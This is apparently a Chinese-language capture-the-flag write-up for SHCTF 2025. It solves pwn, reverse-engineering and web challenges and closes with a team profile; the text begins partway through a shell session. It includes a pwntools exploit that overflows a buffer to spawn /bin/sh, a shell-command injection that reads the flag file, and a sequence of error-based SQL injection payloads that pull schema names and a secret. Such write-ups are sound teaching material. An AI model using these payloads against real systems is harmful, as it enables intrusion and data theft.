$                                                                                           l                                                                                                    ls                                                                                                   ls
bin
dev
flag
lib
lib32
lib64
libx32
pwn
usr
$ cat flag
SHCTF{415a3883-63fd-4dce-93e7-6aacd9473528}$  
```

**得到：SHCTF{415a3883-63fd-4dce-93e7-6aacd9473528}**



### int_overflow

#### 题目信息

> **Challenge Info - [阶段1] int_overflow**
>
> 题目难度: **入门**
>
> 出题人：**carry**
>
> ------
>
> 10+10==100？

#### 解题过程

**信息搜集**

```shell
checksec pwn
```

```shell
[*] '/home/kali/Desktop/ctf/int/pwn'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

**查看源码**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+Fh] [rbp-11h]
  int v5; // [rsp+10h] [rbp-10h] BYREF
  int i; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v7; // [rsp+18h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  init(argc, argv, envp);
  banner();
  v4 = 0;
  for ( i = 0; i <= 1; ++i )
  {
    printf("plz input number%d\n", i + 1);
    __isoc99_scanf("%d", &v5);
    if ( v5 > 9 )
      return 0;
    v4 += v5;
  }
  if ( v4 == 100 )
    backdoor(100LL);
  else
    puts("hahaha, I know it is safe");
  return 0;
}
```

```c
unsigned __int64 __fastcall backdoor(char a1)
{
  char buf[10]; // [rsp+13h] [rbp-1Dh] BYREF
  char command[11]; // [rsp+1Dh] [rbp-13h] BYREF
  unsigned __int64 v4; // [rsp+28h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  strcpy(command, "echo hello");
  puts("oops, you can do it, what is your name");
  read(0, buf, (unsigned int)(a1 - 80));
  system(command);
  puts(buf);
  return v4 - __readfsqword(0x28u);
}
```

```assembly
-000000000000001D     _BYTE buf;
-000000000000001C     // padding byte
-000000000000001B     // padding byte
-000000000000001A     // padding byte
-0000000000000019     // padding byte
-0000000000000018     // padding byte
-0000000000000017     // padding byte
-0000000000000016     // padding byte
-0000000000000015     // padding byte
-0000000000000014     // padding byte
-0000000000000013     char command[8];
```

**分析**

- `v4`是`char`类型，我们可以用负数字符相加
- `backdoor`里有字符超限，我们可以通关`buf`覆盖`command`的内容

#### 题目答案

**最终脚本**

```python
from pwn import *

context.os = "linux"
context.arch = "amd64"
# context.log_level = "debug"

r = remote("challenge.shc.tf", 31584)
# r = process(["./pwn"])
# elf = ELF("./pwn")
# rop = ROP([elf])

payload = (100 - 256) // 2
r.sendlineafter("number1\n".encode(), str(payload).encode())

payload = (100 - 256) - payload
r.sendlineafter("number2\n".encode(), str(payload).encode())

# gdb.attach(r)

payload = cyclic(10)
payload += "/bin/sh\x00".encode()
r.sendafter("name\n".encode(), payload)

r.interactive()
r.close()
```

```shell
[*] Switching to interactive mode
$ ls
bin
dev
flag
lib
lib64
pwn
$ cat flag
SHCTF{3def1ab0-2b31-477c-8c0e-5935efe4b4f0}$ 
```

**得到：SHCTF{3def1ab0-2b31-477c-8c0e-5935efe4b4f0}**



## reverse

### a_cup_of_tea

#### 题目信息

> **Challenge Info - [阶段1] a_cup_of_tea**
>
> 题目难度: **简单**
>
> 出题人：**carry**
>
> ------
>
> 一个人，一杯茶，一道逆向做一天

#### 解题过程

**查看题目**

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  _DWORD v4[4]; // [rsp+0h] [rbp-30h] BYREF
  char dest[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  sub_1209(a1, a2, a3);
  v4[0] = 0;
  v4[1] = 0;
  v4[2] = 0;
  v4[3] = 0;
  sub_12D3(v4);
  strcpy(dest, src);
  if ( !(unsigned int)sub_1439(v4) )
  {
    puts("password error");
    exit(1);
  }
  puts("password correct");
  printf("here is your flag: SHCTF{%s}\n", dest);
  return 0LL;
}
```

```c
int sub_1209()
{
  puts("Welcome to SHCTF 2025!");
  puts("this is a signin challenge");
  return puts("plz input the correct password");
}
```

```c
char *__fastcall sub_12D3(__int64 a1)
{
  __isoc99_scanf("%16s", src);
  if ( strlen(src) != 16 )
  {
    puts("password length error");
    exit(1);
  }
  sub_1241(a1, src);
  return src;
}
```

```c
void __fastcall sub_1241(__int64 a1, __int64 a2)
{
  int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; i <= 15; ++i )
    *(_DWORD *)(4LL * (i / 4) + a1) += *(char *)(i + a2) << (8 * (i % 4));
}
```

```c
_BOOL8 __fastcall sub_1439(_DWORD *a1)
{
  sub_134E(a1, aWelcomeToShctf_0);
  if ( *a1 != -1699360031 || a1[1] != -1120419751 )
    return 0LL;
  sub_134E(a1 + 2, aWelcomeToShctf_0);
  return a1[2] == -1515845715 && a1[3] == -1804683212;
}
```

```c
__int64 __fastcall sub_134E(unsigned int *a1, _DWORD *a2)
{
  __int64 result; // rax
  unsigned int v3; // [rsp+1Ch] [rbp-24h]
  unsigned int v4; // [rsp+20h] [rbp-20h]
  int v5; // [rsp+24h] [rbp-1Ch]
  unsigned int i; // [rsp+28h] [rbp-18h]

  v3 = *a1;
  v4 = a1[1];
  v5 = 0;
  for ( i = 0; i <= 0x1F; ++i )
  {
    v5 -= 1640531527;
    v3 += (v4 + v5) ^ (16 * v4 + *a2) ^ ((v4 >> 5) + a2[1]);
    v4 += (v3 + v5) ^ (16 * v3 + a2[2]) ^ ((v3 >> 5) + a2[3]);
  }
  *a1 = v3;
  result = v4;
  a1[1] = v4;
  return result;
}
```

```assembly
.data:0000000000004010 aWelcomeToShctf_0 db 'welcome_to_SHCTF',0
```

**分析**

- TEA加密算法

#### 题目答案

**最终脚本**

```python
# 逆向TEA算法解密flag

def decrypt(v, k):
    """
    逆向TEA解密算法
    v: 2个32位无符号整数的列表
    k: 4个32位无符号整数的列表（密钥）
    """
    v0, v1 = v
    k0, k1, k2, k3 = k
    delta = 0x9E3779B9  # 黄金比例
    sum_ = delta * 32  # 32轮
    
    for i in range(32):
        # 逆向第二轮操作
        v1 -= ((v0 << 4) + k2) ^ (v0 + sum_) ^ ((v0 >> 5) + k3)
        v1 &= 0xFFFFFFFF  # 确保32位无符号
        
        # 逆向第一轮操作
        v0 -= ((v1 << 4) + k0) ^ (v1 + sum_) ^ ((v1 >> 5) + k1)
        v0 &= 0xFFFFFFFF  # 确保32位无符号
        
        sum_ -= delta
        sum_ &= 0xFFFFFFFF  # 确保32位无符号
    
    return [v0, v1]

# 目标值（从伪C代码中提取）
target = [-1699360031, -1120419751, -1515845715, -1804683212]

# 将目标值转换为无符号整数
target_uint = [x & 0xFFFFFFFF for x in target]

# 密钥（welcome_to_SHCTF）
key_str = "welcome_to_SHCTF"
# 将密钥转换为4个32位无符号整数
key = []
for i in range(0, 16, 4):
    # 小端序
    k = 0
    for j in range(4):
        k |= ord(key_str[i+j]) << (8 * j)
    key.append(k)

print("密钥:", [hex(k) for k in key])
print("目标值:", [hex(t) for t in target_uint])

# 解密前两个值
v1 = decrypt(target_uint[0:2], key)
print("解密后前两个值:", [hex(v) for v in v1])

# 解密后两个值
v2 = decrypt(target_uint[2:4], key)
print("解密后后两个值:", [hex(v) for v in v2])

# 将解密后的值转换为16字节的密码
password = b''
for val in v1 + v2:
    for i in range(4):
        password += bytes([(val >> (8 * i)) & 0xFF])

print("\n密码:", password)
print("密码(十六进制):", password.hex())
print("密码(ASCII):", password.decode('ascii', errors='replace'))
```

```shell
密钥: ['0x636c6577', '0x5f656d6f', '0x535f6f74', '0x46544348']
目标值: ['0x9ab5d2e1', '0xbd37c059', '0xa5a607ad', '0x946eb834']
解密后前两个值: ['0x5f773057', '0x4e6b5f75']
解密后后两个值: ['0x745f7730', '0x21214133']

密码: b'W0w_u_kN0w_t3A!!'
密码(十六进制): 5730775f755f6b4e30775f7433412121
密码(ASCII): W0w_u_kN0w_t3A!!
```

**得到：SHCTF{W0w_u_kN0w_t3A!!}**



## web

### ez-ping

#### 题目信息

> **Challenge Info - [阶段1] ez-ping**
>
> 题目难度: **入门**
>
> 出题人：**浅兮**
>
> ------
>
> 域名测试系统中真的只能测试域名吗？我不相信！

#### 解题过程

```shell
localhost&&more /fla?
```

```shell
PING localhost (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.031 ms
64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.090 ms
64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.053 ms
64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.067 ms

--- localhost ping statistics ---
4 packets transmitted, 4 packets received, 0% packet loss
round-trip min/avg/max = 0.031/0.060/0.090 ms
SHCTF{a76b78d7-a657-4317-9bb5-27e7b5463b9b}
```

#### 题目答案

**得到：SHCTF{a76b78d7-a657-4317-9bb5-27e7b5463b9b}**



### 上古遗迹档案馆

#### 题目信息

> **Challenge Info - [阶段1] 上古遗迹档案馆**
>
> 题目难度: **入门**
>
> 出题人：**Moli_ya**
>
> ------
>
> 你咋直接攻击我啊？渗透测试里不是这样的啊！你应该先向我发送一个数据确认我是什么类型的题目，然后通过不断测试来找到我的漏洞点，提升测试成功率，最后在特殊漏洞点给我发送点特殊数据，我就会给你我的正确flag，最后你才能得分啊。

#### 解题过程

**获取数据库名称**

```sql
1' and extractvalue(1,concat(0x7e,database())) #
```

**得到：~archive_db**

**获取表名**

```sql
1' and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=0x617263686976655f6462 limit 1 offset 1))) #
```

**得到： ~secret_vault**

**获取列名**

```sql
1' and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=0x617263686976655f6462 and table_name=0x7365637265745f7661756c74 limit 1 offset 1))) #
```

**得到： ~secret_key**

**获取flag**

```shell
1' and extractvalue(1,concat(0x7e,(select substring(secret_key,1,50) from secret_vault limit 1))) #
```

```shell
系统错误 (Debug Mode On): XPATH syntax error: '~SHCTF{1ed9c0f3-37b8-44a8-a19...'
```

```shell
1' and extractvalue(1,concat(0x7e,(select substring(secret_key,25,50) from secret_vault limit 1))) #
```

```shell
系统错误 (Debug Mode On): XPATH syntax error: '~-a194-8ae0c8ef4abb}'
```

**拼起来得到：SHCTF{1ed9c0f3-37b8-44a8-a194-8ae0c8ef4abb}**

#### 题目答案

**得到：SHCTF{1ed9c0f3-37b8-44a8-a194-8ae0c8ef4abb}**



# 队伍

## 名称

**菜鸟对对队**



## 口号

**对对对对对**



## 成员

### 队长

- **probie**



## 留言

### probie

- **暂无**



## 成果

### 排名

- **0 / 0**

### 解题

- **0 / 0**

### 分数

- **0 / 0**